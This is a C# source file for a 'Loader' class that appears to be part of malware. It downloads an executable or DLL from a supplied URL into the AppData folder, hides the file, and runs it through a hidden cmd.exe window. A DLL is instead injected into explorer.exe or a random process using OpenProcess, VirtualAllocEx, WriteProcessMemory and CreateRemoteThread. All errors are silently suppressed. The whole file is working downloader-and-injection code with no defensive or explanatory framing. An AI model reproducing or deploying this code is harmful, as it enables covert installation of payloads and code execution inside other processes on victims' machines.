using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace who.Func
{
    class Loader
    {
        public static void Run(string URL, string filename)
        {
            string Temp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            if (URL != "") 
            {
                if (filename.EndsWith(".exe"))
                {
                    try
                    {
                        if (File.Exists(Temp + "\\" + filename))
                        {
                            try
                            { File.Delete(Temp + "\\" + filename); }

                            catch { }
                        }

                        using (WebClient client = new WebClient())
                        {
                            client.DownloadFile(URL, Temp + "\\" + filename);
                        }

                        File.SetAttributes(Temp + "\\" + filename, FileAttributes.Hidden);

                        string command = Temp + @"\" + filename;

                        var proc = new ProcessStartInfo()
                        {
                            UseShellExecute = true,
                            WorkingDirectory = @"C:\Windows\System32",
                            FileName = @"C:\Windows\System32\cmd.exe",
                            Arguments = "/c " + command,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        Process.Start(proc); // Старт через cmd
                    }

                    catch { }
                }

                else if (filename.EndsWith(".dll"))
                {
                    if (File.Exists(Temp + "\\" + filename))
                    {
                        try
                        { File.Delete(Temp + "\\" + filename); }

                        catch { }
                    }

                    try {
                        using (WebClient client = new WebClient())
                        {
                            client.DownloadFile(URL, Temp + "\\" + filename);
                        }

                        File.SetAttributes(Temp + "\\" + filename, FileAttributes.Hidden);

                        Execute(Temp + "\\" + filename);
                    }

                    catch { }
                }
                
            }

        }

        #region Dll Inject

        public static int inject(string dllPath, Process tProcess)
        {
            Process targetProcess = tProcess;
            string dllName = dllPath;
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            return 0;
        }

        public static void Execute(string dll)
        {
            Process proc;

            try
            {
                if (Process.GetProcessesByName("explorer").Length > 0)
                {
                    proc = Process.GetProcessesByName("explorer")[0];
                }

                else
                {
                    Process[] processes = Process.GetProcesses();
                    int countProcesses = processes.Length;

                    Random rnd = new Random();
                    int random_proc = rnd.Next(1, countProcesses);
                    proc = Process.GetProcesses()[random_proc];
                }

                inject(dll, proc);
                isInjected = true;
            }

            catch
            {

            }
        }
        public static Boolean isInjectedAlready()
        {
            if (isInjected)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        #region DllImports
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
        #endregion

        #region constans
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // used for memory allocation
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        #endregion

        public static bool isInjected = false;
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process(
            [In] IntPtr hProcess,
            [Out] out bool wow64Process
        );

        static readonly bool is64BitProcess = (IntPtr.Size == 8);
        static readonly bool is64BitOperatingSystem = is64BitProcess || InternalCheckIsWow64();

        public static bool InternalCheckIsWow64()
        {
            if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
                Environment.OSVersion.Version.Major >= 6)
            {
                using (Process p = Process.GetCurrentProcess())
                {
                    bool retVal;
                    if (!IsWow64Process(p.Handle, out retVal))
                    {
                        return false;
                    }
                    return retVal;
                }
            }
            else
            {
                return false;
            }
        }

        #endregion
    }
}
